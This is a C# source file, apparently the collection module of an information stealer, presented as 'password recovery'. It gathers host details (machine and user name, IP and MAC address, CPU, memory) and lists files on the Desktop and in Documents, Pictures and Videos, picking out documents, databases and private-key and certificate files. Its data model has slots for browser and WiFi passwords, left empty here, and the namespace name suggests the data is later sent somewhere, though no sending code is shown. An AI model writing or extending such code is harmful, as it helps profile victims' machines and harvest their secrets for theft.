using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text.Json;
using Microsoft.Win32;

namespace CSharpSender.Recovery
{
    public class RecoveryData
    {
        public SystemInfo SystemInfo { get; set; }
        public List<RecoveredAccount> BrowserPasswords { get; set; } = new List<RecoveredAccount>();
        public List<WiFiPassword> WiFiPasswords { get; set; } = new List<WiFiPassword>();
        public List<RecoveredFile> InterestingFiles { get; set; } = new List<RecoveredFile>();
    }

    public class RecoveredAccount
    {
        public string Url { get; set; }
        public string Username { get; set; }
        public string Password { get; set; }
        public string Browser { get; set; }
        public DateTime RecoveredAt { get; set; } = DateTime.Now;
    }

    public class WiFiPassword
    {
        public string SSID { get; set; }
        public string Password { get; set; }
        public string SecurityType { get; set; }
        public DateTime RecoveredAt { get; set; } = DateTime.Now;
    }

    public class SystemInfo
    {
        public string ComputerName { get; set; }
        public string Username { get; set; }
        public string OSVersion { get; set; }
        public string IPAddress { get; set; }
        public string MACAddress { get; set; }
        public string Architecture { get; set; }
        public long TotalMemory { get; set; }
        public string CPUInfo { get; set; }
        public DateTime RecoveredAt { get; set; } = DateTime.Now;
    }

    public class RecoveredFile
    {
        public string Path { get; set; }
        public string Name { get; set; }
        public long Size { get; set; }
        public DateTime Modified { get; set; }
        public string Extension { get; set; }
        public DateTime RecoveredAt { get; set; } = DateTime.Now;
    }

    public static class PasswordRecovery
    {
        public static RecoveryData GetAllRecoveryData()
        {
            var data = new RecoveryData
            {
                SystemInfo = GetSystemInfo(),
                BrowserPasswords = new List<RecoveredAccount>(),
                WiFiPasswords = new List<WiFiPassword>(),
                InterestingFiles = FindInterestingFiles()
            };

            return data;
        }

        #region System Information Recovery

        public static SystemInfo GetSystemInfo()
        {
            var info = new SystemInfo
            {
                ComputerName = Environment.MachineName,
                Username = Environment.UserName,
                OSVersion = Environment.OSVersion.ToString(),
                IPAddress = GetLocalIPAddress(),
                MACAddress = GetMACAddress(),
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86",
                TotalMemory = GetTotalMemory(),
                CPUInfo = GetCPUInfo()
            };

            return info;
        }

        private static string GetLocalIPAddress()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static string GetMACAddress()
        {
            try
            {
                var nics = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces();
                foreach (var nic in nics)
                {
                    if (nic.OperationalStatus == System.Net.NetworkInformation.OperationalStatus.Up && nic.NetworkInterfaceType != System.Net.NetworkInformation.NetworkInterfaceType.Loopback)
                    {
                        return nic.GetPhysicalAddress().ToString();
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private static long GetTotalMemory()
        {
            try
            {
                var gc = new Microsoft.VisualBasic.Devices.ComputerInfo();
                return (long)gc.TotalPhysicalMemory;
            }
            catch
            {
                return 0;
            }
        }

        private static string GetCPUInfo()
        {
            try
            {
                var cpu = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
                if (cpu != null)
                {
                    var cpuName = cpu.GetValue("ProcessorNameString")?.ToString();
                    if (!string.IsNullOrEmpty(cpuName))
                        return cpuName;
                }
            }
            catch { }
            return "Unknown CPU";
        }

        #endregion

        #region File Recovery

        public static List<RecoveredFile> FindInterestingFiles()
        {
            var files = new List<RecoveredFile>();
            
            try
            {
                string[] searchPaths = {
                    Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)
                };
                
                string[] interestingExtensions = { 
                    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx", 
                    ".zip", ".rar", ".7z", ".tar", ".gz",
                    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
                    ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv",
                    ".mp3", ".wav", ".flac", ".aac",
                    ".exe", ".msi", ".bat", ".cmd", ".ps1",
                    ".sql", ".db", ".sqlite", ".mdb",
                    ".key", ".pem", ".p12", ".pfx"
                };
                
                foreach (string path in searchPaths)
                {
                    if (Directory.Exists(path))
                    {
                        try
                        {
                            var foundFiles = Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly)
                                .Where(f => interestingExtensions.Contains(Path.GetExtension(f).ToLower()))
                                .Select(f => new RecoveredFile
                                {
                                    Path = f,
                                    Name = Path.GetFileName(f),
                                    Size = new FileInfo(f).Length,
                                    Modified = File.GetLastWriteTime(f),
                                    Extension = Path.GetExtension(f).ToLower()
                                })
                                .Take(20); // Limit to prevent too many files
                            
                            files.AddRange(foundFiles);
                        }
                        catch (UnauthorizedAccessException)
                        {
                            // Skip directories we can't access
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error finding interesting files: {ex.Message}");
            }

            return files;
        }

        #endregion
    }
}
